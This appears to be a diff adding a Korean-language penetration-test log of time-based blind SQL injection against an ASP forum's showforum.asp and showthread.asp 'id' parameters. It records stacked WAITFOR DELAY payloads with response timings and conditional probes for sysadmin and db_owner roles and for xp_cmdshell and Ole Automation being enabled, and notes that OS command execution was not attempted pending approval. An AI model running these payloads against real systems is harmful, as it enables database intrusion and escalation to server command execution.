@@ -1,0 +1,42 @@
+========================================================================
+E1. WAITFOR 지연 스케일링 (showforum.asp id)
+========================================================================
+  1;WAITFOR DELAY '0:0:01'--                   → 200 3191 3.374864
+  1;WAITFOR DELAY '0:0:03'--                   → 200 3191 9.520481
+  1;WAITFOR DELAY '0:0:08'--                   → 200 3191 24.352860
+  1 (기준선)                                      → 200 3077 0.399069
+
+=== showthread.asp id 동일 확인 ===
+  0;WAITFOR DELAY '0:0:02'--                   → 200 7924 4.521571
+  0;WAITFOR DELAY '0:0:08'--                   → 200 7924 16.484803
+
+========================================================================
+E2. IF 조건부 지연 = 임의 T-SQL 문장 실행 확인 (showthread.asp)
+========================================================================
+  IF 1=1 WAITFOR DELAY '0:0:04'--        → 500 1208 0.360981   (항상 참 → 4s 나와야 함)
+  IF 1=2 WAITFOR DELAY '0:0:04'--        → 500 1208 0.336058   (항상 거짓 → 지연 없어야 함)
+
+========================================================================
+E3. DB 권한 / xp_cmdshell (조건부 지연 오라클, 실행 없음)
+========================================================================
+  [sysadmin 역할 여부]
+    1;IF (SELECT IS_SRVROLEMEMBER('sysadmin'))=1 WAITFOR DELAY '0:0:05'--
+    → 200 3341 0.344015
+  [db_owner 여부]
+    1;IF (SELECT IS_SRVROLEMEMBER('db_owner'))=1 WAITFOR DELAY '0:0:05'--
+    → 200 3345 0.349313
+  [현재 사용자=dbo]
+    1;IF (SELECT USER_NAME())='dbo' WAITFOR DELAY '0:0:05'--
+    → 200 3315 0.375604
+  [xp_cmdshell 활성]
+    1;IF EXISTS(SELECT 1 FROM sys.configurations WHERE name='xp_cmdshell' AND value_in_use=1) WAITFOR DELAY '0:0:05'--
+    → 200 3487 0.353845
+  [Ole Automation 활성]
+    1;IF EXISTS(SELECT 1 FROM sys.configurations WHERE name='Ole Automation Procedures' AND value_in_use=1) WAITFOR DELAY '0:0:05'--
+    → 200 3527 0.370179
+
+========================================================================
+E4. stacked 로 읽기 DML 가능성 확인용(실행 안 함) — 참고 정보만
+========================================================================
+  sysadmin 이면 xp_cmdshell 로 OS 명령 실행 가능 → 별도 사전 승인 필요(실행 안 함)
+EXIT_R7B=0
